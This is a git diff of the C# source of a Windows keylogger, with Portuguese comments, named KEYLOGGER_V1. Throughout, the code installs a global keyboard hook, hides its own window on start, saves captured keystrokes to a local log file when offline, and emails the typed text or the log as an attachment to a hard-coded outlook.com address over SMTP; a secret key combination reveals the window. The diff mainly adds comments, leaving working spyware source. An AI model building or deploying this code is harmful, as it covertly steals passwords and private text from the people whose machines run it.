@@ -20,8 +20,8 @@ namespace KEYLOGGER_V1
         int conta;
         string[] names = new string[3];
         
-        //istanciar Class Caputura de Teclas
-        globalKeyboardHook gkh = new globalKeyboardHook();
+        
+        globalKeyboardHook gkh = new globalKeyboardHook(); //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
         private void HookAll()
         {
             foreach (object key in Enum.GetValues(typeof(Keys)))
@@ -37,43 +37,34 @@ namespace KEYLOGGER_V1
 
 
 
-        public FrmHome()
+        public FrmHome()//METODO CONSTRUTOR.
         {
             InitializeComponent();
         }
-        public FrmHome(bool visibilidade)
-        {
-            //InitializeComponent();
-            if (visibilidade == true){
-                visivel();
-            }
-           
-        }
-
-        private void FrmHome_Load(object sender, EventArgs e)
-        {   //deixa o formulario Invisivel
-            invisivel();
-            MetodosDeEventosHook();
-            if (Verifica_backup() == true)
+     
+        private void FrmHome_Load(object sender, EventArgs e)//EVENTO: Inicialização do formulário, para verificações Iniciais.
+        {   
+            invisivel();                   //Torna o formulário INVISIVEL
+            MetodosDeEventosHook();        //Ativa os eventos do teclado.
+          
+            if (Verifica_backup() == true)     //Comparação de existencia do Log
             {
-                if (Habilitar_web() == true)
-                {   // enviar backup para email
-                    EnviarEmailBackup(@"C:\Key\Keylogger.txt");
-                    //deleta backup
-
+                if (Habilitar_web() == true)   //Verificação de Conexão.
+                {  
+                    EnviarEmailBackup(@"C:\Key\Keylogger.txt"); //Envia o log por EMAIL.
                 }
 
             }
 
         }
-        void invisivel()
+        void invisivel()//METODO: Deixa o formulário invisivel.
         {
             this.Opacity = 0;
             this.ShowInTaskbar = false;
 
         }
 
-        public void visivel()
+        public void visivel()//METODO: Deixa o formulário visivel.
         {
             this.Opacity = 100;
             this.ShowInTaskbar = true;
@@ -84,7 +75,7 @@ namespace KEYLOGGER_V1
             gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
             HookAll();
         }
-        bool Verifica_backup()
+        bool Verifica_backup()//METODO: Verifica se diretorio do LOG existe.
         {
 
             if (File.Exists(@"C:\Key\Keylogger.txt"))
@@ -98,16 +89,14 @@ namespace KEYLOGGER_V1
 
         }
 
-        private void tmEnviarEmail_Tick(object sender, EventArgs e)
+        private void tmEnviarEmail_Tick(object sender, EventArgs e)//EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
         {
-            BackupOrEmail();
+            BackupOrEmail(); 
         }
 
-
-        [DllImport("wininet.dll")]
-
-        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue);
-        bool Habilitar_web()
+        [DllImport("wininet.dll")]                                                                       //Utilizado para a Confirmação da conexão. 
+        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue); //Utilizado para a Confirmação da conexão.
+        bool Habilitar_web()//METODO: Verifica que se a conexão, e retorna [TRUE] 
         {
             bool result;
 
@@ -122,21 +111,21 @@ namespace KEYLOGGER_V1
 
             catch
             {
-               // MessageBox.Show("Esta sem Internet!!");
+               
                 result = false;
 
             }
 
             return result;
         }
-        void EnviarEmail(String Texto)
+        void EnviarEmail(String Texto)//METODO: Email com as teclas digitadas. 
         {
 
             MailMessage Email;
             Stopwatch Stop = new Stopwatch();
             Email = new MailMessage();
-            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
-            Email.From = (new MailAddress("OrionOficial@outlook.com"));
+            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));// ENVIE PERGUNTAS NESSE EMAIL ;)
+            Email.From = (new MailAddress("OrionOficial@outlook.com")); // <--------------------------
             Email.Subject = "KeyLLogger";
             Email.IsBodyHtml = true;
             Email.Body = Texto;
@@ -152,14 +141,13 @@ namespace KEYLOGGER_V1
             txtTextoDigitado.Clear();
 
         }
-
-        void EnviarEmailBackup(String DirBackup)
+        void EnviarEmailBackup(String DirBackup)//METODO: Envia email com o log como anexo. 
         {
             MailMessage Email;
             Stopwatch Stop = new Stopwatch();
             Email = new MailMessage();
-            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
-            Email.From = (new MailAddress("OrionOficial@outlook.com"));
+            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));  // ENVIE PERGUNTAS NESSE EMAIL ;)
+            Email.From = (new MailAddress("OrionOficial@outlook.com")); // <--------------------------
             Email.Subject = "KeyLLogger";
             Email.IsBodyHtml = true;
             Email.Attachments.Add(new Attachment(DirBackup));
@@ -168,52 +156,53 @@ namespace KEYLOGGER_V1
             using (cliente)
             {
                 cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
-                                                                                                       // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
+                                                                                                                // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                 cliente.EnableSsl = true;
                 cliente.Send(Email);
             }
-            //MessageBox.Show("Backup enviado com sucesso!!", "Email - Enviado!");
 
         }
-        void criarBackup(String DirBackup)
+
+        void criarBackup(String DirBackup)//METODO: Cria o (backup /log) das teclas digitadas.
         {
 
             StreamWriter SW = new StreamWriter(DirBackup, true);
             SW.Write(txtTextoDigitado.Text);
             SW.Close();
             txtTextoDigitado.Clear();
-           // MessageBox.Show("Criado backup com sucesso!");
         }
-        void BackupOrEmail()
+        void BackupOrEmail()//METODO: Verifica a conexão , se estiver conectado a internet ele envia por EMAIL.
         {
 
             if (Habilitar_web() == true)
             {
                 if (txtTextoDigitado.Text != "")
                 {
-                    EnviarEmail(txtTextoDigitado.Text);
+                    EnviarEmail(txtTextoDigitado.Text); //Envia email.
                 }
 
 
             }
             else
             {
-
-                criarBackup(@"C:\Key\Keylogger.txt");
-
+                if (txtTextoDigitado.Text != "")
+                {
+                   criarBackup(@"C:\Key\Keylogger.txt"); //Cria Backup.
+                }
             }
         }
 
-        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
+        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
         {
-            File.Delete(@"C:\Key\Keylogger.txt");
-            if (txtTextoDigitado.Text != ""){
-                criarBackup(@"C:\Key\Keylogger.txt");
+            File.Delete(@"C:\Key\Keylogger.txt"); //Deleta o (arquivo / Log) anterior.
+            if (txtTextoDigitado.Text != "")      //Compara se foi digitado teclas.
+            {
+                criarBackup(@"C:\Key\Keylogger.txt"); //Salva um novo backup.
             }
             
         }
 
-        String GerenciamentoDeCaracteres(String Key)
+        String GerenciamentoDeCaracteres(String Key)//METODO: Mapeamento de teclas, e Comparação das teclas para substituição.
         {
 
             switch (Key)
@@ -345,26 +334,18 @@ namespace KEYLOGGER_V1
 
         }
 
-
-
-
-        private void FrmHome_KeyPress(object sender, KeyPressEventArgs e)
-        {
-
-        }
-
-        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)
+        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)//EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
         {
             String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento
 
-            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter)
+            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter) // Comparação das teclas. simulação das teclas de atalho 
             {
-                if (this.Opacity == 0 && this.ShowInTaskbar == false)
+                if (this.Opacity == 0 && this.ShowInTaskbar == false)             // Verifica se o formulario já esta invisivel
                 {
                     visivel();
 
                 }
-                else { 
+                else {                                                            
                     
                     invisivel(); 
                                                   
@@ -372,7 +353,7 @@ namespace KEYLOGGER_V1
             }
         }
 
-        String teclaDeVisibilidade(String texto, String caracter)
+        String teclaDeVisibilidade(String texto, String caracter) //METODO: Pega a quantidade de caracteres necessario "[Ctrl][Delete][Esc]"
         {
 
             int contCarac = caracter.Length;
